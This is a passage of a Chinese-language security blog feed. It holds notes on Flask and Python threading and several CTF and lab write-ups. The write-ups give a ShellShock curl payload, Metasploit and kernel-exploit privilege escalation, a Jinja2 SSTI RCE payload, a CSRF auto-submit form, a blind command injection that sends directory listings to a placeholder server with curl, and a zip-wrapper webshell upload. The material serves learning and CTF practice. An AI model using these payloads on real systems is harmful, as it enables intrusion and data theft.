&lt;- WSGI (Standard)</p><h3 id="Reference-and-Suggest-to-View"><a href="#Reference-and-Suggest-to-View" class="headerlink" title="Reference and Suggest to View"></a>Reference and Suggest to View</h3><p>To write this passage I use many answers from the Internet no matter Zhihu StackOverFlow or CSDN. I want to deliver my thanks to their writings and kind answers. Many may not list here since the amount of reference I have used.</p><ul><li>  <a href="https://www.zhihu.com/column/c_1248388401738657792">Flask开发学习</a></li><li>  <a href="https://blog.csdn.net/lovedingd/article/details/106685914">WSGI、Flask及Werkzeug三者之间的关系</a></li><li>  <a href="https://stackoverflow.com/questions/20766684/what-benefit-is-added-by-using-gunicorn-nginx-flask">What benefit is added by using Gunicorn + Nginx + Flask?</a></li><li>  <a href="https://stackoverflow.com/questions/4929626/what-are-wsgi-and-cgi-in-plain-english">What are WSGI and CGI in plain English?</a></li><li>  <a href="https://serverfault.com/questions/220046/why-is-setting-nginx-as-a-reverse-proxy-a-good-idea">Why is setting Nginx as a reverse proxy a good idea?</a></li><li>  <a href="https://www.cnblogs.com/my-blogs-for-everone/p/9804187.html">Python 工具包 werkzeug 初探</a></li><li>  And the official websites of WSGI, Flask, Gunicorn, Werkzeug, Jinja</li></ul><h3 id="At-last"><a href="#At-last" class="headerlink" title="At last"></a>At last</h3><p>I am a beginner of Flask and such things and will definitely make lots of mistakes. I have tried my best to gather the reference and learn from the Internet. If you find any mistakes, please contact me through my E-mail:<a href="mailto:zwh_china@outlook.com">zwh_china@outlook.com</a> or QQ:2540649733(雨过天晴&amp;伞落人离)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h3&gt;&lt;p&gt;As I touched thes</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>关于Python的多线程和多进程-入门</title>
    <link href="https://zwh-china.github.io/2021/01/19/%E5%85%B3%E4%BA%8Epython%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B-%E5%85%A5%E9%97%A8/"/>
    <id>https://zwh-china.github.io/2021/01/19/%E5%85%B3%E4%BA%8Epython%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B-%E5%85%A5%E9%97%A8/</id>
    <published>2021-01-18T16:05:54.000Z</published>
    <updated>2021-04-20T21:15:38.459Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>1.Thread(线程)，线程通俗的说是比进程小的单位，一个CPU的core中可以同时存在多个Thread，Thread的特殊之处就在于当遇到耗时例如sleep的操作时，可以把这个Thread挂起转而去处理同核心的另一个Thread。</p><p>2.Process(进程)，进程中可分为多个Thread，在Process开始前会在RAM划分出一定的空间，把Process的多个Thread放到CPU的多个核心或一个核心去跑。</p><p>所以其各有特点，对于Multithreading和Multiprocessing来讲</p><blockquote><p><a href="https://www.youtube.com/watch?v=ecKWiaHCEKs">The Following List Ref From:Threading vs Multiprocessing in Python</a></p></blockquote><p>Threading:</p><ul><li>  A new thread is spawned within the existing process</li><li>  Starting a thread is faster than starting a process</li><li>  Memory is shared between all threads</li><li>  Mutexes（互斥锁）often necessary to control access to shared data</li><li>  One GIL(Global Interpreter Lock) for all threads</li></ul><p>Multiprocessing:</p><ul><li>  A new process is started independent from the first process</li><li>  Starting a process is slower than starting a thread</li><li>  Memory is not shared between processes</li><li>  Mutexes not necessary (unless threading in the new process)</li><li>  One GIL(Global Interpreter Lock) for each process</li></ul><p>此处还特别说明，Linux中存在的os.fork()，也就是建立子进程，fork出的子进程其实就是一个新的Process，除了极个别参数外，包括代码内容和父进程都是一致的，fork后父子进程便是各自独立，内存自然也不是共享，可以说子进程是父进程的一个副本，我最早看到这个概念觉得很奇怪。既然如此，子进程为什么不会从头开始再把代码跑一遍，例如父进程先print(‘Hello World’)然后再fork一个子进程，那么子进程是否会也打印Hello World呢？答案是不会的。那么为什么又说子进程是父进程的副本呢？原因就是在fork时，子进程爷继承了父进程的代码和数据，这个数据包含PC指针寄存器的值，这样子进程开始的位置也就是主进程执行fork函数的下一行语句。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;1.Thread(线程)，线程通俗的说是比进程小的单位，一个CPU的core中可以同时存在多个Thread，Thread的特殊之处就在于当遇到耗时例如sleep的操作时，可以把这个Thread挂起转而去处理同核心的另一个Thread。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次ShellShock和kernal提权漏洞</title>
    <link href="https://zwh-china.github.io/2020/11/26/%E8%AE%B0%E4%B8%80%E6%AC%A1shellshock%E5%92%8Ckernal%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>https://zwh-china.github.io/2020/11/26/%E8%AE%B0%E4%B8%80%E6%AC%A1shellshock%E5%92%8Ckernal%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-11-25T18:23:49.000Z</published>
    <updated>2021-04-20T21:15:38.457Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>原YouTube视频：<a href="https://www.youtube.com/watch?v=TS%5C_yfDqr%5C_3s">https://www.youtube.com/watch?v=TS\_yfDqr\_3s</a></p><h2 id="第一步namp端口扫描"><a href="#第一步namp端口扫描" class="headerlink" title="第一步namp端口扫描"></a>第一步namp端口扫描</h2><pre><code>nmap -sC -sV -oN nmap/initial IP</code></pre><h2 id="第二步nikto网站扫描"><a href="#第二步nikto网站扫描" class="headerlink" title="第二步nikto网站扫描"></a>第二步nikto网站扫描</h2><pre><code>nikto -h &quot;http://xxx.xxx.xxx.xxx&quot; tee xxx.log</code></pre><h2 id="第三步网站目录扫描"><a href="#第三步网站目录扫描" class="headerlink" title="第三步网站目录扫描"></a>第三步网站目录扫描</h2><pre><code>gobuster dir -u http://xxx.xxx.xxx.xxx -w /usr/share/wordlists/dirbuster/xxx视频中老外通过扫目录扫到/backup。进入后发现是备份的SSH RSA证书，使用ssh -i xxx user@ip # xxx is the file you save RSA Encrypt Licence</code></pre><p>但在视频中未获成功，仍需要输入rsa密钥。此时 他决定用openwall破解RSA加密，在此时他因为locate不到rockyou更新了一下db</p><pre><code>sudo updatedb</code></pre><p>在等待的同时gobuster扫描到一个/secret目录，进入发现是一个乌龟的png图片，他将其wget下载后</p><pre><code>strings turtle.png</code></pre><p>试图找到隐藏内容但没成功，此时他去openwall找到了ssh2john，使用</p><pre><code>python3 ssh2john.py id_rsa &gt;xxx.logjohn xxx.log --wordlist=rockyou.txt</code></pre><p>破解得到弱口令letmein，结果是错的，仍无法进ssh。 事情似乎陷入了僵局，但转身他又换了个思路进网站的/cgi-bin，但是发现permission denied，关于cgi-bin（Common Gateway Interface）谷歌有介绍。他关掉gobuster目录扫描转而开始枚举扫描具体文件 其实在此之前他看了下网站首页的服务器响应头是Apache/Ubuntu，这说明cgi-bin下的应用应该大多为bash，而非exe等应用程序，这便为下文暴力破解指定文件尾缀做了解释</p><pre><code>gobuster dir -x sh,cgi,log,html,php -u http://10.10.14.250/cgi-bin/ -w /usr/share/wordlists/disbuster/xxxx.txt</code></pre><p>在扫描时，他回过身去看nikto的扫描，无独有偶，nikto也指出cgi-bin似乎有漏洞，甚至更进一步指出可能是有shellshock vulnerability. 他进一步发现cgi-bin下存在test.cgi，访问后输出JHello World！,他看了CVE介绍和维基百科了解了漏洞大概时会造成RCE后了解了大概使用方法，进而去github找现成的Poc</p><pre><code>Payload: curl -H &quot;User-Agent: () &#123; : ; &#125;; echo; echo; /bin/bash -c &#39;id&#39;&quot; &quot;http://xxx.xxx.xxx.xxx/cgi-bin/test.cgi&quot;</code></pre><p>作者提到的是，原本的payload用的是 env X=,但在本例可能是直接类似终端输出所以不用env，同时其中涉及的文件路径应当是绝对路径。</p><p>发现有这个漏洞后，它使用了metasploit</p><pre><code>msfconsolemsf5&gt;search shellshockmsf5&gt;use exploit_name # choose the tool you want to usemsf5&gt;exploit(name_xxxxxx)(*)no payload configuredmsf5&gt;exploit(name_xxxxxx)&gt;show options设置相关参数后masf5&gt;exploit(name_xxxxxx)&gt;run</code></pre><p>之后便成功反弹shell，下一步就是提权拿到root</p><p>反弹shell中ls -la看到有俩用户ryan，root同时反弹shell用户是www用户</p><p>ctrl+c 中止回到meterpreter</p><pre><code>meterpreter&gt;cd /dev/shmmeterpreter&gt;shell -i # nothing happensmeterpreter&gt;upload /opt/linpeas.shmeterpreter&gt;shell -ibash -iwww@ubuntu:/run/shm$ chmod +x linpeas.shwww@ubuntu:/run/shm$ ./linpeas.sh  tee linlog.txt</code></pre><p>linpea揭示了机器内核版本比较老为 3.13.0-32generic</p><pre><code>searchsploit 3.13.0-----------------------------------------------------------------------------------Exploit Title                                         Path -----------------------------------------------------------------------------------Linux Kernel 3.13.0 &lt;3.19(Ubuntu 12.           linux/local/37292.cLinux Kernel 3.13.0 &lt;3.19(Ubuntu 12.           linux/local/37293.txtShellcodes: No Resultssearchsploit -x linux/local/37292.c# skim the filesearchsploit -x linux/local/37293.txt# skim the filesearchsploit -m linux/local/37292.c# mirror the poc file</code></pre><pre><code>meterpreter &gt; upload xxx/37292.cmeterpreter &gt; gcc ./37292.cmeterpreter &gt; ./37292.croot&gt;</code></pre><p>最终提权成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;原YouTube视频：&lt;a href=&quot;https://www.youtube.com/watch?v=TS%5C_yfDqr%5C_3s&quot;&gt;https://www.youtube.com/watch?v=TS\_yfDqr\_3s&lt;/a&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF之Flask初探</title>
    <link href="https://zwh-china.github.io/2020/11/23/syc%E4%BA%8C%E9%9D%A2-wp/"/>
    <id>https://zwh-china.github.io/2020/11/23/syc%E4%BA%8C%E9%9D%A2-wp/</id>
    <published>2020-11-23T01:19:09.000Z</published>
    <updated>2021-04-20T21:15:38.455Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>For most cases I have met so far,they use Jinja2 template. In some ways I list some of the points appear in the Flask CTF Problem</p><ul><li>  Crack PIN via DebugConsole get shell</li><li>  SSTI（Server Side Template Injection）</li><li>  Python BaseClasses</li><li>  Session Cheat</li><li>   Flag in Environment</li><li>  …</li></ul><p>CTF problems often aim to check multiple points in a single problem. So the Flask problem often mix two or more points for example, a basic Flask problem I came across during my second interview in SYC Group. The problem mix the SSTI ,Session Cheat together with some of the bypass technique. However,no matter how the problem is set,there must be a or some break points. For example the File Upload Vulnerability you can upload your payload to one of the specific file on the server where the template will be rendered. And during the process you may need to use Directory Traversal vulnerability to carry out the exploit. In the following part I will issue some of the way to solve the specific problem I mentioned above.</p><h2 id="PIN"><a href="#PIN" class="headerlink" title="PIN"></a>PIN</h2><p>The pin of Flask debug console is generated in certain way if we can store enough information we can try to reverse the PIN and enter it in the debug console and then get shell.</p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI referring as Server Side Template Injection often appears in the comment or contact section of the web page. If you input some of the elaborated designed payload then there may be a chance to trigger SSTI and get some of the sensitive information or get reverse shell , OOB and RCE.</p><h2 id="Python-Base-Classes"><a href="#Python-Base-Classes" class="headerlink" title="Python Base Classes"></a>Python Base Classes</h2><p>Flask itself is based on Python so it is easy to think that if there is any chance that we can run Python through Flask. Luckily it is accessible. By using such payload</p><pre><code>  &#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;  # get base class information  # try to find OS or Popen  &#123;&#123;''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__("o'+'s").po'+'pen("cat /super_secret_fla''g.txt")').read()&#125;&#125;</code></pre><p>And by this way you can attain RCE and even create a Reverse Shell</p><p>In most CTF game there is a WAF for example they may ban ‘{}’ or ‘_‘ and etc. There are many way to bypass I will not enume them here.</p><h2 id="Session-Cheat"><a href="#Session-Cheat" class="headerlink" title="Session Cheat"></a>Session Cheat</h2><p>Session cheat is a very interesting trick. The session was generated in a certain way when you attain the SecretKey you can generate your custom content and replace your cookie to cheat you are admin. I use the flask_session_cookie_manager on github and <a href="https://jwt.io/">https://jwt.io</a> to do this job. But you should make sure you enter the  page and get Secret_Key.</p><h5 id="About-Flask-SSID"><a href="#About-Flask-SSID" class="headerlink" title="About Flask SSID"></a>About Flask SSID</h5><p>The generation of Flask SSID</p><p>Front Part: base64 encode json segment</p><p>End Part: Signature part generated through Secret_Key</p><p>(most cases they use hash256 algorithm)</p><h2 id="Reference-Link"><a href="#Reference-Link" class="headerlink" title="Reference Link"></a>Reference Link</h2><p>1)<a href="https://xz.aliyun.com/t/8029">浅谈flask ssti 绕过原理 - 先知社区</a></p><p>2)<a href="https://0day.work/ictf-2017-flasking-unicorns-writeup-or-how-we-might-have-rooted-your-ictf-vm/#flaskingunicorns">iCTF 2017 flasking unicorns writeup - Or how we might have rooted your iCTF VM Sebastian Neef - 0day.work</a></p><p>3)<a href="https://hackmd.io/@Chivato/HyWsJ31dI">Jinja2 SSTI Research - HackMD</a></p><p>4)<a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门 - 先知社区</a></p><p>5)<a href="https://my.oschina.net/u/4416864/blog/3625351">python-flask-ssti(模版注入漏洞) - osc_1x3afxmv的个人空间 - OSCHINA - 中文开源技术交流社区</a></p><p>6)<a href="https://www.cnblogs.com/zaqzzz/p/10263396.html">SSTI注入绕过(沙盒逃逸原理一样) - 冬泳怪鸽 - 博客园</a></p><p>7)<a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">SSTI注入语句总结_G0blinK的博客-CSDN博客</a></p><p>8)<a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度.</a></p><p>9)<a href="https://blog.csdn.net/qq_45521281/article/details/106243544">SSTI 服务器端模板注入_Mr. Anonymous的博客-CSDN博客</a></p><p>10)<a href="https://www.it610.com/article/1293120386883461120.htm">ssti(服务器模板注入的总结及几道例题) - it610.com</a></p><p>11)<a href="https://blog.csdn.net/m0_37519490/article/details/80774069">flask学习笔记–flask内置session处理机制_xuewen小渣渣的博客-CSDN博客</a></p><p>12)<a href="https://www.cnblogs.com/zaqzzz/p/10243961.html">flask利用session身份伪造 - 冬泳怪鸽 - 博客园</a></p><p>利用工具</p><p>1）<a href="https://github.com/noraj/flask-session-cookie-manager">flask_session_cookie_manager</a></p><ol start="2"><li><a href="https://jwt.io/">JWT</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;For most cases I have met so far,they use Jinja2 template. In some ways I list some of the points appear in the Flask CTF Pr</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>GeekChallenge-WriteUp</title>
    <link href="https://zwh-china.github.io/2020/11/19/geekchallenge-writeup/"/>
    <id>https://zwh-china.github.io/2020/11/19/geekchallenge-writeup/</id>
    <published>2020-11-19T03:49:49.000Z</published>
    <updated>2021-04-20T21:15:38.453Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h3 id="Web-Welcome"><a href="#Web-Welcome" class="headerlink" title="Web-Welcome"></a>Web-Welcome</h3><p>这道题emm估计给不少马虎的人当头一棒，诶，除了GET还有啥方式？那肯定是post啊，果断随便POST个数据过去玩玩，嗯？看到了点源码，简单分析一下，害，不就是sha1绕过嘛，这里有两种方法，咱可以来硬核点的直接利用sha1碰撞，也可以温柔点的数组绕过例如 roam1[]=1&amp;roam2[]=2然后即可进入phpinfo，这东西其实挺重要的，简单阅览，在core下看到疑似flag文件的路径，哇，如此简单，直接访问，我擦，怎么回事，居然404 Not Found，你在逗我？？？开F12看下响应报文便可拿到flag，这招真是阴险。P.S注意这里有一个知识点需要注意，可能有人直接去访问<a href="http://49.234.224.119:8000/var/www/html/f1444aagggg.php">http://49.234.224.119:8000/var/www/html/f1444aagggg.php</a>，这样在返回报文时看不到flag的，因为<a href="http://49.234.224.119:8000/">http://49.234.224.119:8000/</a>其实就代表了处于html目录，因而想访问住需要/f1444aagggg.php即可SYC{w31c0m3_t0_5yc_r0@m_php1}</p><h3 id="Web-flagshop"><a href="#Web-flagshop" class="headerlink" title="Web-flagshop"></a>Web-flagshop</h3><p>flagshop这道题其实有相当多CTF题目类似，这类题需要把使得自己余额变得很大从而得到flag，为达到这点所采取的手段也可谓五花八门什么溢出之类的都有，我们不瞎猜上来先看，好家伙，浪爷最有钱了，再看有个转账和买flag的地方，还有个报告。这不由得使人想到XSS攻击，当然其实有些细节能体现例如在反馈的那个界面，只有投诉是浪爷回复，并且浪爷暗示我会好好看你们的报告，这便让我想到CSRF，再看转账，应该是通过SSID判断余额，那么目前就好说了，只要浪爷点转账连接，他就会给我打钱，值得注意的是这里是利用的POST因而不能简单传一个含参连接让他去点，所以我们借助一个中间站点，让浪爷前往后伪造表单提交进行转账，中间服务器的钓鱼界面代码如下</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;http://173.82.206.142:8005/transfer.php&quot; id=&quot;test&quot; method=&quot;POST&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;target&quot;&gt;&lt;br&gt;        &lt;input type=&quot;text&quot; name=&quot;money&quot;&gt;&lt;br&gt;        &lt;input type=&quot;text&quot; name=&quot;messages&quot;&gt;            &lt;/form&gt;&lt;/body&gt;&lt;script&gt;    var f=document.getElementById(&quot;test&quot;);    f.getElementsByTagName(&quot;input&quot;)[0].value=&quot;CUITCUIT&quot;;    f.getElementsByTagName(&quot;input&quot;)[1].value=&quot;100000000000000000000000&quot;;    f.getElementsByTagName(&quot;input&quot;)[2].value=&quot;RCE&quot;;    f.submit();&lt;/script&gt;&lt;/html&gt;</code></pre><p>值得注意的是，提交界面要选投诉，验证码的含义是，验证码前5位符合给定式样，直接Python算一下即可，这里值得提到的一点是PHP默认用32位MD5，而非16位MD5，这两种MD5加密同一个密文，结果是完全不相同的SYC{cross_s1t3_r3q43st_4orgery_1s_44nny}</p><h3 id="Web-朋友的学妹"><a href="#Web-朋友的学妹" class="headerlink" title="Web-朋友的学妹"></a>Web-朋友的学妹</h3><p>这题白给好吧，view-source，base64直接把flag=U1lDe0YxQF80c19oNExwZnVsbGxsbGx9中”=”后的内容，base64decode即可，我起了一枪秒了，有什么好说的。SYC{F1@_4s_h4Lpfullllll}</p><h3 id="Web-EZwww"><a href="#Web-EZwww" class="headerlink" title="Web-EZwww"></a>Web-EZwww</h3><p>这道题其实得凭一定经验，在各大平台题做多了，或者你百度出了，得知可以<a href="http://47.100.46.169:3901/www.zip">http://47.100.46.169:3901/www.zip</a>可以把网站备份下载，这道题你就做出来80%了，下载后解压，直接打开flag，你以为秒了，不，还差点，这个SYC{th1s_1s_4_f4ke_fl4g}肯定骗了不少激动的没细看的Geeker，仔细一看，好家伙，是fakeflag啊，还得乖乖回来看index，读完代码，就能明白，就是得POST一个a让其等于c3ljbDB2ZXI=在base64decode后的结果，在线base64decode一下得到sycl0ver，直接POST过去，轻松拿下只见初音gif（我已经白嫖了这个gif存表情了）下出现SYC{Backup_1s_4_good_h4bit_l0l}</p><h3 id="Web-EZgit"><a href="#Web-EZgit" class="headerlink" title="Web-EZgit"></a>Web-EZgit</h3><p>这道题，主要还是环境配置，虽说只需要Githack或者Githacker，但是因为大部分工具采用Python2，而我们目前电脑装的一般以Python3为主，并且我在win10环境下总是报错，换了很多版本也没用。迫不得已用kali安装了GitHack使用命令 python GitHack <a href="http://47.100.46.169:3902/.git">http://47.100.46.169:3902/.git</a> 执行后生成对应目录，显示flag too old，这时我们需要对git有一定基本了解，cd进入软件生成的对应目录，使用git log –reflog得到历史commit信息，然后用git reset –hard复原版本，得到fl4g.php，从而得到flag。SYC{I_l0ve_sycl0ver_l0l}</p><h3 id="Web-刘壮的黑页"><a href="#Web-刘壮的黑页" class="headerlink" title="Web-刘壮的黑页"></a>Web-刘壮的黑页</h3><p>这题最大坑点就是进去了找不到代码，得翻到最下面，az，然后第二坑，username和passwd一个GET一个POST，这两点都注意到这个题就能轻松秒了。SYC{d0_y0u_k0nw_GET?}</p><h3 id="Web-我是大黑客"><a href="#Web-我是大黑客" class="headerlink" title="Web-我是大黑客"></a>Web-我是大黑客</h3><p>这题应该是为了科普蚁剑的使用，典型的一句话shell，按要求把东西下下来，注意下，部分电脑估计识别为zip之类的压缩包格式，导致不少人以为这玩意是压缩文件打不开，实际上删除尾缀.bak即可当作liuzhuang.php打开，打开后得到一句话密钥liuzhuang，值得一提的是我在github下载的蚁剑，在初始化解压时出错，最后通过手动解压得以解决，同时蚁剑是github的一个开源项目，大家别去第三方下载，这种渗透工具非常容易藏后门。进入后跳转至根目录便能看见醒目的flag文件，打开得到SYC{1iuzHuang_yyd_G0d!}</p><h3 id="Web-ezbypass"><a href="#Web-ezbypass" class="headerlink" title="Web-ezbypass"></a>Web-ezbypass</h3><p>按图索骥，strcmp函数属于老套路了，他想比较两个字符串，我们偏偏不给它字符串，给它俩数组这样strcmp返回值便是NULL，在按要求以GET形式上传后，得到提示，第一步完成，第二步传一个字符，让他值为123，说句实话这题我也吃了亏，以为找个ASCII值为123的char即可，也就是”{“，但是死活不行，最后才考虑到用正则阶段%00绕过，这其实也算套路了，注意这里是POST方法上传，并且值得一提的是%00的正则绕过只对PHP版本小于5.3.4起作用，它的作用挺多偶尔的话上传文件可能用%00阶段绕过类型判断，同时我在一篇文章看到数据当是POST接收情况的时候，正确的用法应该是我们需要对 %00 做一个URL编码，也就是URL-decode，这是因为 %00 截断在 GET 中被 url 解码之后是空字符。但是在 POST 中 %00 不会被 url 解码，所以只能通过 burpsuite 修改 hex 值为 00 （URL decode）进行截断。但在本题中并未体现。SYC{php_4s_so_funny}</p><h3 id="Web-知X堂的php教程"><a href="#Web-知X堂的php教程" class="headerlink" title="Web-知X堂的php教程"></a>Web-知X堂的php教程</h3><p>这题主要利用exec危险函数，这题极其阴险因为看注释估计会以为用xss或者xxe，然而实际并非如此。大概有两个做法，在没有关闭temp前，利用wget传一句话，我想应该是可以的，这种办法可能是最简单的，但因为某些原因我并未能够尝试，我采用blind command injection方法，顾名思义，看不到结果的注入，但是我们想要的到根目录的flag肯定需要知道根目录下文件，文件夹分布的情况，而这是需要回显信息的，不然你想你光执行 ls ../../../../出了结果你也看不到对吧。所以需要把执行结果想办法让我们看到。可是exec相当于执行了Linux系统Shell，ls命令输出位置是stdout，而不是浏览器上的echo，所以我们换个办法构造payload:?dirname=;curl –data “dir=$(ls -la ../../../)” <a href="http://xxx.xxx.xxx.xxx/curl.php">http://xxx.xxx.xxx.xxx/curl.php</a>，相当于把ls ../../../../ POST到我们服务器上，在服务端curl.php</p><pre><code>&lt;?phpif(isset ($_POST[&#39;dir&#39;]))&#123;    $output= $_POST[&#39;dir&#39;];    file_put_contents(&quot;output.txt&quot;,$output);&#125;?&gt;</code></pre><p>这样在output.txt就能输出对应POST过来的数据了，得到的数据大概会是这样</p><p><img src="http://106.15.74.181/wp-content/uploads/2020/11/1.png"></p><p>一目了然，看到flag位置，这也就比较好理解我们直接利用?dirname=../../../../../只能看到一个bash脚本的原因了，flag是在一个目录里，其实这也有点小坑，提示说flag在根目录里，实际在根目录一个文件夹里，az。另外这里可能遇到一个坑，如果你用contents=$(ls ../../../../../../../../);curl <a href="http://xxx.xxx.xxx.xxx/curl.php?contents=">http://xxx.xxx.xxx.xxx/curl.php?contents=</a>$contents，只会得到bin，这是因为exec默认只返回最后一行执行结果，同理curl <a href="http://xxx.xxx.xxx.xxx/">http://xxx.xxx.xxx.xxx/</a>`ls` 最终也只能得到bin，这里涉及一点shell知识 ` ` 会把包在其中内容当作命令执行，如果’ ‘管道符没被禁用，可以重定向ls结果将其作为base64加密输入内容进行加密后传输，这样也可以得到正确结果，当然这就是属于题外话了。最终进入目录用listsource.php得到其内容，或者照葫芦画瓢用exec 执行cat并返回结果。次题还涉及一个小知识点Linux中’ ../ ‘相当于返回上级目录’ ./ ‘则代表当下目录’ / ‘代表根目录 SYC{Mak3_ZXT_sh*t_4oreVer}</p><h3 id="Web-Longlone"><a href="#Web-Longlone" class="headerlink" title="Web-Longlone"></a>Web-Longlone</h3><p>解这题步骤大概可以总结为：拿源码–&gt;代码审计–&gt;session篡改–&gt;上传图片马–&gt;zip伪协议读取–&gt;蚁剑链接–&gt;在根目录找到flag</p><p>首先来说拿源码，总的来说就是看到file，page加等于号读页面想到伪协议，利用老套路php://filter/convert.base64-encode/resource=xxx拿到各个页面源码，这里有俩坑点，一个是xxx后不加.php因为在index中给补全了尾缀.php这点很重要在后续zip流调用图片马中影响很大，另一个则是拿到页面源码，其中admin/user是需要在login.php看一下登录框action中得到，这里面东西有点多可能一时间脑子糊了，没找到。</p><p>拿到源码了，审计开始呗，先看PHP部分，我们最关心的肯定是如何进后台，阅读后得知用户名是定死的Longlone密码则是由mt19937生成的高质量随机数，你想正面拿下？不存在的，所以乖乖想办法绕过，这里涉及的知识点就是如果携带的SSID服务器没得，那就返回空，用SSID存的密码和输入的密码比较，只要我们篡改SSID例如改成10086，密码为空便能进后台，这里直接不输入密码是不行的，过不了前端检测，我们直接抓包修改后成功登入.</p><p>进入后台映入眼帘的便是浪爷高二做的诗，如此美妙，果然作诗才是浪爷主业，web只是一个小爱好而已。</p><blockquote><p>雪雀低鸣,于山涧早,厉雪初灭.茅屋设宴无趣,痴情处,细雨催离.回眸再望君颜,竟泪雨交接.勿念念,丝丝藕线,白雾渺渺溪水寒.自古流水作多情,怎堪那凄凄无花劫!今朝梦醒何处?酒方台,翻碗碎碟.已成桑田,即是花好月圆空念,便纵有万般思愁,更与何人诉?</p></blockquote><p>话不多说，按zip流要求，包好图片马，这里给个例子先创建一个test.php里面写上一句话shell，把它压成test.zip，再改后缀为.jpg后上传，上传拿到路径，使用伪协议zip流进行蚁剑访问根目录，便可以得到flag。</p><p>这里注意，服务端每到00或05便会删除文件，手速要快。同时zip指定路径为绝对路径，所以payload大概是长这样<a href="http://173.82.206.142:8006/index.php?page=zip:///var/www/html/assets/img/upload/b75d98c7dd9b6527440abbdc2efd10452eeac9ea.jpg%23test">http://173.82.206.142:8006/index.php?page=zip:///var/www/html/assets/img/upload/b75d98c7dd9b6527440abbdc2efd10452eeac9ea.jpg%23test</a>，zip:///其中//是zip://规范/var表示根目录下的var文件夹，这便体现了zip伪协议流的绝对路径要求。SYC{php_15_635t_1@n94a93_1n_th3_w0r1d!}</p><h3 id="Web-忏悔的刘壮"><a href="#Web-忏悔的刘壮" class="headerlink" title="Web-忏悔的刘壮"></a>Web-忏悔的刘壮</h3><p>这题可以手动直接试出来，正如前面Web-3朋友的学妹，右下角的妹子说的F12是个好东西（对着妹子点一些不该点的地方有惊喜doge），F12转到储存–&gt;站点存储能看到session和answer，按照cookie中answer存储的选项便可以答对题，值得注意的是每次答对题session会变，如果答错也会变并且导致你答对次数归零，但如果是因为超时未答题session不会变，答对次数也不会变。每次访问或刷新do_answer都会给新的answer。所以如果你手动答题，宁可超时刷新也不要点错了还提交。最终flag的session为eyJkb25lX3RpbWVzIjowfQ.X48jxQ._35k1fJ3trPz4iTceUdbnnq7f44，页面是check，flag是SYC{this_is_your_flag}</p><h3 id="PWN-RunCode"><a href="#PWN-RunCode" class="headerlink" title="PWN-RunCode"></a>PWN-RunCode</h3><p>记得把代码缩进去掉，代码部分除去不必要空格。否则报错，随便写段读文件，并输出内容的C代码即可。样例如下</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main()&#123;FILE* fp;char a;fp = fopen(&quot;../../../home/ctf/flag&quot;, &quot;r&quot;);while (!feof(fp))&#123;fscanf(fp, &quot;%c&quot;, &amp;a);printf(&quot;%c&quot;, a);&#125;&#125;</code></pre><p>轻松拿到Flag:SYC{C0din9_ls_E4sy_T0_You}</p><h3 id="Re-WhatsApk"><a href="#Re-WhatsApk" class="headerlink" title="Re-WhatsApk"></a>Re-WhatsApk</h3><p>看见APK第一件事干嘛？直接拖进jeb就完了，奥利给，直接先看看Manifest flag果然不再，看我进bytecode搜索一下SYC，我去居然没的，再搜flag，好家伙这么多，WDNMD，浪费30min后无果，看了下hint，安卓APK结构，那我就zip打开呗，最后产还是搜索SYC，在resources.arsc中找到flag SYC{WelC0me_to_android!}</p><h3 id="Re-HelloAndroid"><a href="#Re-HelloAndroid" class="headerlink" title="Re-HelloAndroid"></a>Re-HelloAndroid</h3><p>好家伙，我直接扔进jeb，进bytecode搜索SYC，直接秒杀SYC{Android_in_Java_is_easy!}</p><h3 id="Web-带恶人六撞"><a href="#Web-带恶人六撞" class="headerlink" title="Web-带恶人六撞"></a>Web-带恶人六撞</h3><p>sqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a></p><p>扫描到注入方式1）boolean-based blind 2）error-based 3）time-based blind 